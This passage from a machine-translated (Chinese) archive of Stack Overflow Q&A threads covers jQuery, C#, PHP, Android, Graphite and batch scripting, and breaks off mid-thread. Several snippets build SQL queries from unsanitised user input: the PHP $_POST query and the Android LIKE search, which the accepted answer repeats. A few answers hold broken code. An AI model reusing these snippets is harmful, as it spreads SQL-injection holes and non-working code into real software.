这里的变量是“错误”和 html 数据。为了成功， addClass 将是“消息成功”。

有没有一种方法可以将这四个组合成一个函数，然后只调用一个并将成功/错误和数据传递给它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T14:24:28.087

添加自己的 jQuery 函数很容易：

```
$.fn.showErrors = function() {
  return this.removeClass().addClass("message error").show()
    .html('<li>' + json.Errors.join('<li>'));
}; 
```

然后：

```
$message.showErrors(); 
```

请注意，您实际上并不需要`</li>`结束标签。

一般来说，像这样作为属性添加的 jQuery 函数`$.fn`应该期望`this`引用当前的 jQuery 对象。该函数应该返回该值，以便 jQuery 的正常链接行为将起作用。稍微令人困惑的一点是，因为`this`它*已经*`$(this)`是一个 jQuery 对象，所以无需再次包装它——换句话说，无需编写。

*编辑*— 抱歉，我已经离开互联网一段时间了（令人震惊！）该代码假定“json”只是漂浮在周围。它可能应该是一个参数：

```
$.fn.showErrors = function(json) {
  return this.removeClass().addClass("message error").show()
    .html('<li>' + json.Errors.join('<li>'));
}; 
```

调用它：

```
$message.showErrors(json); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:32:14.820

```
jQuery.fn.updateErrors = function(errors) {
  var cssClass, errorsHtml;

  if(errors.length === 0) {
    cssClass   = "success";
    errorsHtml = "";
  } else {
    cssClass = "error";
    errorsHtml = "<li>" + errors.join("</li><li>") + "</li>";
  }

  return this.removeClass().addClass("message " + cssClass)
             .show().html(errorsHtml);
}; 
```

它将根据`errors`数组是否为空来决定类应该是“错误”还是“成功”。当然，如果你的逻辑比这更复杂，这个函数也可以是它的家。

用法：

```
$message.updateErrors(json.Errors); 
```

# c# - C#.Net 中文本框的命令行样式插入符号

> ID：12760616
> 
> 赞同：0
> 
> 时间：2012-10-06T14:21:10.887
> 
> 标签：c#, .net, vb.net

如何将文本框闪烁插入符号更改为命令行样式插入符号，即。文本框中的水平光标。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T16:12:23.900

请尝试以下代码

```
[DllImport("user32.dll")]
static extern bool CreateCaret(IntPtr hWnd, IntPtr hBitmap, int nWidth, int nHeight);
[DllImport("user32.dll")]
static extern bool ShowCaret(IntPtr hWnd);

public Form1()
{
    InitializeComponent();
}

private void Form1_Shown(object sender, EventArgs e)
{
    CreateCaret(textBox1.Handle, IntPtr.Zero, 10, textBox1.Height);
    ShowCaret(textBox1.Handle);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:27:38.363

请尝试以下示例代码。

```
this.Cursors = Cursor.None;
this.cursors = cursor.pointer or cursor.arrow 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-08T19:25:34.817

我使用如下代码让它工作（感谢 Prabhakantha）。在处理文本框 Enter 事件后，我不得不使用计时器来设置光标：

```
 private void textBox1_Enter(object sender, EventArgs e)
    {
        timer1.Enabled = true;
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
        timer1.Enabled = false;
        CreateCaret(textBox1.Handle, IntPtr.Zero, 6, textBox1.Height);
        ShowCaret(textBox1.Handle);
    } 
```

不过，这似乎有点骇人听闻。一定会有更好的办法。

# frameworks - 使用什么框架来构建 developer.android.com？

> ID：12760617
> 
> 赞同：0
> 
> 时间：2012-10-06T14:21:11.880
> 
> 标签：frameworks, documentation, content-management-system, documentation-generation

[**developer.android.com**](http://developer.android.com)看起来很酷。它是基于任何已知的文档工具，还是完全由谷歌为该站点定制构建？

只是一个带有多个侧边栏和目录小部件的页面示例：

[http://developer.android.com/guide/components/services.html](http://developer.android.com/guide/components/services.html)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:25:04.073

请参阅[http://developer.android.com/assets/js/docs.js](http://developer.android.com/assets/js/docs.js)和[http://developer.android.com/assets/js/global-libraries-combined.js](http://developer.android.com/assets/js/global-libraries-combined.js)

它只是 jQuery、一些库和大量自定义编程。

*   [http://jscrollpane.kelvinluck.com/](http://jscrollpane.kelvinluck.com/)
*   [http://code.google.com/p/google-code-prettify/](http://code.google.com/p/google-code-prettify/)
*   [http://jquery.com/](http://jquery.com/)
*   [http://adomas.org/javascript-mouse-wheel/](http://adomas.org/javascript-mouse-wheel/)
*   [http://benalman.com/projects/jquery-hashchange-plugin/](http://benalman.com/projects/jquery-hashchange-plugin/)
*   [http://peol.github.com/960gridder/](http://peol.github.com/960gridder/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:25:25.053

我认为这只是一个简单干净的网站。

# logging - 使用每小时指标查找每天指标的 Graphite 聚合规则

> ID：12760620
> 
> 赞同：4
> 
> 时间：2012-10-06T14:21:25.387
> 
> 标签：logging, graphite

我在编写聚合规则以绘制每日指标时遇到问题。我有两台服务器将指标名称发送为

> production.email.server_1.total_emails_sent.1h.sum production.email.server_2.total_emails_sent.1h.sum

他们每小时发送一次此指标。我可以通过添加如下聚合规则来找到这两个指标的总和：

production.email.all.1h.sum (3600) = 总和 production.email.*.1h.sum

现在我必须使用相同的每小时指标来找到每天的总和。我想要一个名为

> production.email.server_1.total_emails_sent.1d.sum

我可以通过对`production.email.server_1.total_emails_sent.1h.sum`过去 24 小时的指标求和来找到。我怎样才能找到这个指标？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-11T02:39:56.623

听起来您想要**汇总**功能。

`&target=summarize(production.email.server_1.total_emails_sent.1h.sum, "1day")`

查看[文档的汇总](http://graphite.readthedocs.io/en/latest/functions.html#graphite.render.functions.summarize)。

根据结果​​如何，您甚至可能想尝试[smartSummarize](http://graphite.readthedocs.io/en/latest/functions.html#graphite.render.functions.smartSummarize)函数......

# jquery - 从数据库中读取 XML 字符串并使用 Jquery 进行解析

> ID：12760622
> 
> 赞同：0
> 
> 时间：2012-10-06T14:21:55.293
> 
> 标签：jquery, xml

这是我的 html 页面中的一段 jquery 代码

```
$.ajax({
                url: 'userlist.php',
                type: 'post',
                data: 'id='+extr,
                success: function(results){                 
                    $("#uservidshow").text("Page Title: "+$(results).find("vidlist").attr("title"));
                    //$("#uservidshow").text(results);
                    $(results).find("vids").each(function(){                    
                    $("#uservidshow").append("<br/><br/>Video Name: "+$(this).attr("vtitle")+"<br/>Link: "+$(this).attr("link")+"<br/>Description: "+$(this).find("descr").text()+"<br/><br/>");
                    });                 
                }
            }); 
```

**--- 这是在 div#uservidshow 中显示的输出 ---**

> 页面标题：未定义
> 
> 视频名称：儿童视频
> 
> 链接：[http ://www.youtube.com/watch?v=PIchX1LX0](http://www.youtube.com/watch?v=PIchX1LX0)
> 
> 描述：

* * *

我的问题是：

*   为什么我会得到“未定义”的页面标题？

*   为什么我在描述下得到一个空白而不是显示 cdata 内容？

* * *

**--- 这是来自 userlist.php 的一段代码 ---**

```
<?php

$getid=$_POST['id']; 

....
[few lines of code]
....
            $pickfrmtab= mysql_query("SELECT * FROM mytable WHERE userid='$getid'");    
            if(mysql_num_rows($pickfrmtab)==1){
                while($row = mysql_fetch_array($pickfrmtab)){
                    echo htmlspecialchars_decode($row['pagecontent'], ENT_QUOTES); //'pagecontent' contains my xml string 
                }           
            }else{
                echo "Unable to get PLAYLIST";
            }           

?> 
```

**--- 这是存储在数据库中列名“pagecontent”下的 XML 字符串---**

```
&lt;?xml version=&#039;1.0&#039; encoding=&#039;UTF-8&#039; ?&gt;&lt;vidlist title=&#039;My Fav Videos&#039;&gt;
&lt;vids link=&#039;http://www.youtube.com/watch?v=PIchX1LX0&#039; vtitle=&#039;Kids video&#039;&gt;
&lt;descr&gt;&lt;![CDATA[this is nice]]&gt;&lt;/descr&gt;
&lt;/vids&gt;
&lt;comment allow=&#039;no&#039;&gt;&lt;/comment&gt;
&lt;/vidlist&gt; 
```

* * *

正如您可能已经猜到的那样，我已经将 htmlspecialchars() 应用于实际的 xml 字符串，然后再将其插入数据库

```
$xmldata="<?xml version='1.0' encoding='UTF-8' ?>".$_POST['actualxmlstrng']; 
$xmldata_safe=htmlspecialchars($xmldata, ENT_QUOTES);
//inserted $xmldata_safe into the datacbase field 'pagecontent' SUCCESSFULLY 
```

只是给你一个想法，这是**$xmldata**在应用 htmlspecialchars 之前的样子：

```
<?xml version='1.0' encoding='UTF-8' ?>
<vidlist title='My Fav Videos'>
<vids link='http://www.youtube.com/watch?v=PIchX1LX0' vtitle='Kids video'>
<descr><![CDATA[this is nice]]></descr>
</vids>
<comment allow='no'></comment>
</vidlist> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T15:11:18.880

您没有正确发布数据

使用此代码

```
$.ajax({
 url: 'userlist.php',
                type: 'post',
                data: {'id=': extr},
                dataType: "xml", 
                  ..... 
```

或者你可以使用

```
 $.ajax({

                type: 'GET',
                url: 'userlist.php?id='+extr,
                dataType: "xml", 
                  ..... 
```

# sql - 社交引擎恢复管理员

> ID：12760628
> 
> 赞同：1
> 
> 时间：2012-10-06T14:22:45.633
> 
> 标签：sql, socialengine

我正在使用 Social Engine 4.2.6 运行一个站点。唯一的管理员帐户被黑客入侵，密码被某人更改。如何通过数据库添加新管理员？我尝试了在具有管理员级别的“用户”表中创建新用户的常规方法，但是特定用户只能访问会员区。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-09T09:36:54.123

您必须将`level_id`字段值设置为**1**才能成为超级管理员。

我已经尝试在我的网站上使用一位用户，并且该用户可以访问管理区域。这适用于基本的 socialengine 4.2.6 和原始模块，而不是第三方模块。

# php - 循环遍历元素子元素

> ID：12760632
> 
> 赞同：0
> 
> 时间：2012-10-06T14:23:00.673
> 
> 标签：php, xml, xpath, simplexml

我正在尝试从看起来像 [http://chris.photobooks.com/xml/default.htm?state=8T的结构中提取数据](http://chris.photobooks.com/xml/default.htm?state=8T)

使用以下功能，我试图遍历每个产品标签

```
$dom = new DOMDocument;
$dom->loadXML($resp);
$xpath = new DOMXPath($dom);
$xpath->registerNamespace('ns2', 'http://mws.amazonservices.com/schema/Products/2011-10-01/default.xsd');
$xpath->registerNamespace('a', 'http://mws.amazonservices.com/schema/Products/2011-10-01');

foreach($xpath->query('//a:Product') as $product){
    echo $product->query('//ns2:ItemAttributes/ns2:Author')->item(0)->nodeValue
} 
```

我现在意识到这是从 for 循环中提取数据的错误方法，但正确的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:43:49.270

如果您需要特定标签，您可以执行以下操作：

```
$dom = new DOMDocument;
$dom->loadXML($resp);

foreach($dom->getElementsByTagName("Product") as $product){
    echo $product->getElementsByTagName("Author")->item(0)->nodeValue."<br />";
} 
```

否则（如果您需要全部数据），有社区制作的解决方案可以将整个 XML 转换为简单的数组/对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T15:43:06.503

我想你想要

```
foreach($xpath->query('//a:Product') as $product){
    echo $xpath->query('.//ns2:ItemAttributes/ns2:Author', $product)->item(0)->textContent
} 
```

# postgresql - Postgresql-simple 和 PostgreSQL 特定类型的值

> ID：12760633
> 
> 赞同：1
> 
> 时间：2012-10-06T14:23:14.027
> 
> 标签：postgresql, haskell

我想使用一些特定于数据库的数据类型，如money、point、inet 等。可以将它们作为字符串插入。但是，我找不到如何获取它们的示例，因为它们不在传递给 FromField.mkCompats 函数的列表中。

当我尝试获取这样的值时，出现异常

```
*** Exception: Incompatible {errSQLType = "money", errHaskellType = "Text", errMessage = "types incompatible"} 
```

有没有办法不使用低级 postgresql-libpq 来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-10T13:25:00.320

是的，postgresql-simple 可以做到这一点！但是，以前没有很好的记录。查看[FromField 模块](http://hackage.haskell.org/packages/archive/postgresql-simple/0.3.3.2/doc/html/Database-PostgreSQL-Simple-FromField.html)中的示例代码。

您可以做的是定义一个表示 Money 的类型（例如 Text 的新类型），然后定义一个`FromField`提供适当转换的实例。规范转换将首先检查类型，然后检查数据是否不为空，最后尝试执行转换。由于 money 是 postgresql 本身提供的内置类型，它具有稳定的类型 OID，并且出于类型检查的目的，您需要做的就是使用该`typeOID`函数。

如果类型由 postgresql 的扩展提供，则类型 OID 可能因数据库而异。在这种情况下，我建议使用该`typename`函数来获取不变的字符串。

不幸的是，（还没有？）可以从其他 postgresql 类型向现有`FromField`实例添加转换。

（抱歉回复晚了，我通常不访问 Stack Overflow。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-07T15:16:02.687

我对haskell一无所知，但是，您应该能够只对查询中的值进行类型转换。如：

```
 select your_money_field::text from your_table; 
```

同样，我不知道您是如何查询的……如果您使用的是某种 ORM，那么您可能无法做到这一点。

# ef-code-first - 导航属性为空时无法保存实体，但 Id 已填充

> ID：12760638
> 
> 赞同：2
> 
> 时间：2012-10-06T14:23:53.220
> 
> 标签：ef-code-first, asp.net-web-api, automapper, automapper-2

我最近将我的项目迁移到 MVC4 Web API。在此之前，我使用标准 MVC 控制器。回发实体后，我使用 UpdateModel 更新模型，然后使用 [dbContext].SaveChanges(); 将其保存到数据库中；

一切正常，但在 Web API 中没有 UpdateModel。所以我寻找了一个替代方案：AutoMapper。

我首先使用 EF 5 代码，然后将实体类用作 MVC 的模型。

我的模型类（简化）如下所示：

```
public class Model
{
    [ForeignKey("Parent")]
    public Guid ParentId { get; set; }
    [IgnoreDataMember]
    public TParentEntity Parent { get; set; }

    public string Name { get; get; }
} 
```

当模型以 JSON 格式发送时，在序列化过程中将忽略 Parent 属性。

因此，当使用实体在我的 api 控制器上调用 PUT（更新）方法时，Parent 属性为空。

这是 PUT 方法的代码：

```
public void Put(Model model)
{
    var contextModel = Repository.GetOne(model.Id);
    Mapper.CreateMap<Model , Model>();
    Mapper.Map(model, contextModel);
    Repository.Update();
} 
```

Parent 属性在模型中为空，但在 contextModel 中不为空。AutoMapper 只是用 null 覆盖 contextModel 中的 Parent 属性。

然后，当我保存时，我得到一个 InvalidOperationException，尽管 ParentId 存在：

> 操作失败：无法更改关系，因为一个或多个外键属性不可为空。当对关系进行更改时，相关的外键属性将设置为空值。如果外键不支持空值，则必须定义新关系，必须为外键属性分配另一个非空值，或者必须删除不相关的对象。

任何有关如何以不同方式执行此操作的解决方案或建议都将受到赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T19:51:56.443

我强烈建议不要发回您的实体，而是使用 dto，只使用您希望能够更新的属性。

但是，您可以通过在映射规则中添加忽略来解决此问题（目前）。

```
Mapper.CreateMap<Model , Model>().For(m => m.Parent, opt => opt.Ignore()); 
```

# java - 对话框崩溃应用程序 onClick

> ID：12760639
> 
> 赞同：0
> 
> 时间：2012-10-06T14:24:14.340
> 
> 标签：java, android, android-dialog

我试图在 TextView 的 onClick 方法中显示一个对话框。我使用日志测试了没有对话框的onClick，它可以工作。当我将对话框添加到它时，如下所示：

```
Context context = getApplicationContext();
            Dialog d = new Dialog(context);
            d.setTitle("Test");
            TextView testField = new TextView(context);
            testField.setText("Success!");
            d.setContentView(testField);
            d.show(); 
```

这一切都在 textView 的 onClick 方法中。我得到的异常是无法添加窗口——令牌 null 不适用于应用程序。

有人可以向我解释为什么这不起作用。我在这里有很多关于在 android 中获取异常的问题，答案总是与代码的顺序有关。是否有关于如何订购代码的参考？！

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:36:30.933

代替`Dialog d = new Dialog(context);`

采用`Dialog d = new Dialog(this);`

从中获得的上下文`getApplicationContext();`不应用于对话。

有关更多信息，请参阅问题：

[对话框抛出“无法添加窗口 - 令牌 null 不适用于应用程序”，getApplication() 作为上下文](https://stackoverflow.com/q/5796611/1369222)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:40:42.673

当您在 onClick() 中创建对话框时，请始终使用

```
void onClick(View v)
{
    Dialog d = new Dialog(v.getContext());
                          ^^^^^^^^^^^^^^
    TextView testField = new TextView(v.context);
    testField.setText("Success!");
    d.setContentView(testField);
    d.show();
} 
```

# windows - 变量内变量？

> ID：12760641
> 
> 赞同：0
> 
> 时间：2012-10-06T14:24:24.527
> 
> 标签：windows, variables, batch-file

我创建了一个在 Windows 中搜索用户桌面文件夹的批处理文件。

```
for /F "skip=2 tokens=3* delims= " %%a in ('reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop') do set DESKTOP=%%a 
```

如果我的桌面文件夹不在`C:\Users\User\Desktop`，它将工作并返回正确的文件夹，例如在我的情况下`E:\User\Desktop`。如果桌面文件夹位于 中`C:\Users\User\Desktop`，则上面的脚本将生成`%USERPROFILE%\Desktop`. 稍后在脚本中，我尝试在桌面上创建一个新文件。在第一个选项中它会起作用，因为它`E:\User\Desktop`是一个真实的目录。在第二个中它不会，因为显然`%USERPROFILE%\Desktop`不算作目录。

```
echo start javaw -jar "path/to/program.jar" >"%DESKTOP%\Start program.bat" 
```

如何让它在两种情况下都起作用？

正在做

```
if /I "%DESKTOP%" EQU "%USERPROFILE%\Desktop" 
```

没有帮助，因为它与

```
if /I "%DESKTOP%" EQU "C:\Users\User\Desktop" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:39:41.830

您可以使用`call`扩展变量：
`call set desktop=%desktop%`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T16:39:47.243

你需要一轮额外的正常扩展。正如 wmz 已经回答的那样，您可以使用 CALL 获得额外的一轮。

您应该注意文件夹和文件名中有效的特殊字符，例如`&`or 。`^`我建议在作业中使用引号来保护特殊字符。

```
call set "DESKTOP=%DESKTOP%" 
```

我假设 DESKTOP 的值不包括引号。如果您混合了有时包含引号而有时不包含的定义，那么所有的赌注都将被取消。

假设`DESKTOP=This & that\%VAR%`和`VAR=& the other thing`。使用 CALL 引用赋值的最终结果将是正确的：`This & that\& the other thing`.

我`&`在现实世界中的文件夹名称中看到过，所以引号是一件好事。但是，如果您的值包含`^`. `^`如果通过 CALL 传递，则引用加倍。

假设`DESKTOP=one^two%var%`和`VAR=^three`，使用 CALL 的引用赋值的最终结果将是`one^^two^three`。

我不认为我曾经遇到过`^`文件夹名称，但这是可能的，并且有一个解决方案。您可以使用 CMD /C 进行另一轮扩展，并使用 FOR /F 捕获结果。

下面将给出正确的结果`one^two^three`。我使用`"eol=:"`是因为有效路径永远不能以`:`.

```
for /f "eol=: delims=" %%B in ('cmd /c echo "%DESKTOP%"') do set "DESKTOP=%%~B" 
```

您不需要使用 DESKTOP 的中间分配。在上述所有内容中，您可以用 FOR /F`%%a`代替`%DESKTOP%`.

# javascript - 如何将 JavaScript 类型数组转换为 JavaScript 数组

> ID：12760643
> 
> 赞同：36
> 
> 时间：2012-10-06T14:24:32.070
> 
> 标签：javascript

我有一个 JavaScript Float32Array，我想把它转换成一个普通的 JavaScript 数组。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2016-05-31T16:13:29.650

如果您不需要支持旧浏览器（不幸的是，包括 IE），您可以使用[ES6](http://www.ecma-international.org/ecma-262/6.0/#sec-array.from)[`Array.from`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/from)中添加的：

```
var array = Array.from(floatarr); 
```

这[现在适用](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/from#Browser_compatibility)于所有浏览器的新版本（IE 除外），并且它也适用于所有主要的移动浏览器。

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2012-10-06T14:29:51.517

使用 Array.prototype.slice 转换`float32Array`为 Array。[jsfiddle](http://jsfiddle.net/wTJDy/)

```
var floatarr = new Float32Array(12);
var array =  Array.prototype.slice.call(floatarr); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T14:26:41.717

您可以将它用作任何数组，这意味着您可以这样做：

```
var arr = [];
for (var i=0; i<myFloat32array.length; i++) arr[i] = myFloat32array[i]; 
```

但通常将其用作 Float32Array 而不是转换它更有效。

如果您不想混合不同类型的值，请不要转换它。

# php - 致命错误：未找到 yii 框架类“CDbTestCase”

> ID：12760644
> 
> 赞同：0
> 
> 时间：2012-10-06T14:24:34.197
> 
> 标签：php, unit-testing, yii

我正在关注“使用 yii 1.1 和 php5 进行敏捷 Web 应用程序开发”一书，并且我正在使用固定装置进行测试部分。我遵循了他们的代码，但我无法访问夹具...

在使用 PHPunit 配置夹具后，我正在第 6 章运行单元测试，它返回给我这个

```
Last login: Sat Oct  6 20:09:36 on ttys000
xyz-MacBook-Pro:~ inganious$ /usr/local/bin/phpunit/phpunit /Applications/MAMP/htdocs/trackstar/protected/tests/unit/ProjectTest.php

Fatal error: Class 'CDbTestCase' not found in /Applications/MAMP/htdocs/trackstar/protected/tests/unit/ProjectTest.php on line 3
xyz-MacBook-Pro:~ inganious$ 
```

这是我的 ProjectTest.php 文件

```
class ProjectTest extends CDbTestCase
{

    public $fixtures=array
    (
            'projects'=>'Project',
    );

    public function testCreate()
      {
        //CREATE a new Project
        $newProject=new Project;
        $newProjectName = 'Test Project Creation';
        $newProject->setAttributes(array(
        'name' => $newProjectName,
        'description' => 'This is a test for new project creation',
        'createTime' => '2009-09-09 00:00:00',
        'createUser' => '1',
        'updateTime' => '2009-09-09 00:00:00',
        'updateUser' => '1',
        )
      );
        $this->assertTrue($newProject->save(false));
        //READ back the newly created Project to ensure the creation worked

        $retrievedProject=Project::model()->findByPk($newProject->id);
        $this->assertTrue($retrievedProject instanceof Project);
        $this->assertEquals($newProjectName,$retrievedProject->name);
      }
        public function testRead()
      {
        $retrievedProject = $this->projects('project1');
        $this->assertTrue($retrievedProject instanceof Project);
        $this->assertEquals('Test Project 1',$retrievedProject->name);
      }
        public function testUpdate()
      {
        $project = $this->projects('project2');
        $updatedProjectName = 'Updated Test Project 2';
        $project->name = $updatedProjectName;
        $this->assertTrue($project->save(false));
        //read back the record again to ensure the update worked
        $updatedProject=Project::model()->findByPk($project->id);
        $this->assertTrue($updatedProject instanceof Project);
        $this->assertEquals($updatedProjectName,$updatedProject->name);
      }
        public function testDelete()
      {
        $project = $this->projects('project2');
        $savedProjectId = $project->id;
        $this->assertTrue($project->delete());
        $deletedProject=Project::model()->findByPk($savedProjectId);
        $this->assertEquals(NULL,$deletedProject);
    }
} 
```

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-28T10:57:05.827

检查 pŕotected/tests 中的引导文件是否指向正确的路径，并检查同一文件夹中的 WebTastCase.php 文件是否指向正确的“TEST_BASE_URL”，例如：

```
define('TEST_BASE_URL','http://localhost/my_app/index-test.php/'); 
```

并尝试从 protected/tests 文件夹中运行 phpunit

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-30T08:12:27.100

I encountered the same problem while using PHPStorm. It works when I run the tests (ctrl+shift+F10) while standing on the directory 'unit', but will not work if I stand on the test file itself.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T14:37:18.413

在您的框架目录中应该有一个名为 test 的目录，其中应该有 CDbTestCase.php。你能验证一下吗？如果它丢失了，您就发现了问题，否则您的代码将无法访问框架目录。

# android - ViewPager PagerAdapter with cursor - CursorLoader.onLoadFinished 不会被不同的查询调用

> ID：12760647
> 
> 赞同：8
> 
> 时间：2012-10-06T14:24:42.397
> 
> 标签：android, adapter, android-cursor, android-cursorloader, pager

我正在做一个从数据库中提取报价的报价应用程序，我需要在 ViewPager 中显示报价。

我创建了我的 CursorPagerAdapter，它似乎运行良好。

```
public class MyCursorPagerAdapter extends PagerAdapter {

    private Cursor cursor;
    private LayoutInflater inflater;

public MyCursorPagerAdapter(Context context, Cursor cursor) {

    Log.d(MainActivity.TAG, "MyCursorPagerAdapter.onCreate()");

    this.cursor = cursor;
    this.inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
}

public void swapCursor(Cursor cursor) {
    //if(cursor != null) {

        Log.d(MainActivity.TAG, "swapCursor().");

        this.cursor = cursor;
        //notifyDataSetChanged();
    //}
}

/**
 * Metóda destroyItem
 */
@Override
public void destroyItem(View view, int position, Object object) {

    //cursor.moveToPosition(position);
    ((ViewPager) view).removeView((LinearLayout) object);
}

/**
 * Vráti počet prvkov
 */
@Override
public int getCount() {
    if(cursor == null) {
        return 0;
    } else {
        //return cursor.getCount();
        return 1000;
    }
}

@Override
public Object instantiateItem(View view, int position) {

    position = position % cursor.getCount();

    cursor.moveToPosition(position);

    LinearLayout layout = (LinearLayout) inflater.inflate(R.layout.pager_item, null);

    TextView messageTextView = (TextView) layout.findViewById(R.id.message_textview);
    TextView authorTextView = (TextView) layout.findViewById(R.id.author_textview);

    messageTextView.setText(cursor.getString(cursor.getColumnIndex(QuoteDatabaseHelper.COLUMN_MESSAGE)));
    authorTextView.setText(cursor.getString(cursor.getColumnIndex(QuoteDatabaseHelper.COLUMN_AUTHOR)));

    ((ViewPager) view).addView(layout);
    return layout;
}

/**
 * Metóda isViewFromObject
 */
@Override
public boolean isViewFromObject(View view, Object object) {
    return view == object;
} 
```

}

我也在使用 CursorLoader 异步加载数据库

```
public class MainActivity extends FragmentActivity {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    myCursorPagerAdapter = new MyCursorPagerAdapter(this, null);

    pager = (ViewPager) findViewById(R.id.viewPager);
    pager.setAdapter(myCursorPagerAdapter);

    getSupportLoaderManager().initLoader(-1, null, this);

}

@Override
public Loader<Cursor> onCreateLoader(int arg0, Bundle arg1) {
    return new CursorLoader(this, QuoteContentProvider.CONTENT_URI, null, null, null, null);
}

@Override
public void onLoadFinished(Loader<Cursor> arg0, Cursor cursor) {

    Log.d(MainActivity.TAG, "onLoadFinished()");

    myCursorPagerAdapter.swapCursor(cursor);
    this.cursor = cursor;

    pager.setCurrentItem((int) (myCursorPagerAdapter.getCount() / 2), false);
    pager.startAnimation(animation);
}

@Override
public void onLoaderReset(Loader<Cursor> arg0) {
    myCursorPagerAdapter.swapCursor(null);
}   

} 
```

使用 ContentProvider

```
public class QuoteContentProvider extends ContentProvider {

@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    Cursor cursor = db.query(TABLE_NAME, projection, selection, selectionArgs, null, null, "RANDOM()");
    cursor.setNotificationUri(getContext().getContentResolver(), uri);

    Log.d(MainActivity.TAG, "QuoteContentProvider.query() - cursor.getCount(): " + cursor.getCount());
    // getContext().getContentResolver().notifyChange(uri, null);
    return cursor;
}

} 
```

一切正常，它很好地加载了所有引号，但现在我需要执行搜索。所以我做了一个查询数据库的方法

```
public void search(String keyword) {

    Log.d(MainActivity.TAG, "Search keyword: " + keyword);
    getContentResolver().query(QuoteContentProvider.CONTENT_URI, null, QuoteContentProvider.COLUMN_AUTHOR + " LIKE '%" + keyword + "%' OR " + QuoteContentProvider.COLUMN_MESSAGE + " LIKE '%" + keyword + "%'", null, null);

} 
```

查询很好，我可以看到 ContentProvider.query() 被调用并打印出 cursor.getCount()，

**但是，即使设置了 cursor.setNotificationUri()，现在 MainActivity 中的 onLoadFinished 也不会被调用，我认为它可以工作，因为它在应用程序启动时第一次工作。**

*我实际上尝试使用内容提供程序插入一些数据并调用 getContext().getContentResolver().notifyChange(uri, null); 它触发了 OnLoadFinished，所以我不知道为什么这个不同的查询不会触发 OnLoadFinished。*

非常感谢谁会理解这一点。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T21:51:33.900

MainActivity - 添加/修改：

```
String getSelection(){
    if(null != mSearchKeyword && mSearchKeyword.getLength()>0) {
        return QuoteContentProvider.COLUMN_AUTHOR + " LIKE '%" + mSearchKeyword + "%' OR " +    
            QuoteContentProvider.COLUMN_MESSAGE + " LIKE '%" + mSearchKeyword + "%'";
    } else {
        return null;
    }       
}

String mSearchKeyword = null;

public void search(String keyword) {
    mSearchKeyword = keyword;
    Log.d(MainActivity.TAG, "Search keyword: " + keyword);
    getLoaderManager().restartLoader(-1, null, this);
}

@Override
public Loader<Cursor> onCreateLoader(int arg0, Bundle arg1) {
    return new CursorLoader(this, QuoteContentProvider.CONTENT_URI, null, getSelection(), null, null);
} 
```

触发方法搜索后，在您的加载器上调用 getLoaderManager().restartLoader()。您的旧数据将被丢弃，restartLoader 将触发 onCreateLoader 再次被调用。

交换后不要忘记关闭旧光标

# php - 如何提供不同的响应式图像？

> ID：12760650
> 
> 赞同：2
> 
> 时间：2012-10-06T14:25:18.190
> 
> 标签：php, jquery, mobile, yii, responsive-design

在这个网站上：

*   .php

*   .jquery

*   基于.yii

我们需要有两个或更多不同的信息图图片，具体取决于视口宽度。

*   *客户对 w3c 验证很挑剔*

*   *图片填充解决方案不验证*

*   *应该提供不同的图像，而不仅仅是不同的图像版本*

*   *由于很多原因，*背景图像不是解决方案*

*   *IE8 及以上支持*

我可以使用服务器或客户端版本，没问题。

**原因：**

1.  背景图像技术确实有效，但这些信息图不是背景。

2.  他们应该到达服务器端。

3.  显然，他们需要适应。（和背景大小......嗯......）

4.  更糟糕的是，我们确实有与这些信息图表相关的响应式工具提示图像地图。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:56:04.507

如果媒体查询不是你想要的，那么使用[response.js](http://responsejs.com/#examples)，如果做得正确你也可以加载`<img>`s 。这是一个例子：

```
<-- Load lo-fi.png  when viewport is 0–480px wide or no-js. 
    Load medium.png when viewport is 481–1024px wide. 
    Load hi-fi.png  when viewport is 1025px+ wide. --> 

<img src="lo-fi.png" data-src481="medium.png" data-src1025="hi-fi.png" alt="example" /> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T14:29:46.907

您可以使用`background-image`属性，然后使用媒体查询更改每个视口宽度。

顺便说一句，就 W3C 验证而言，您可能正在使用尚无官方验证器的 HTML5 制作您的网站；）

* * *

## 回答 #3

> 赞同：1
> 
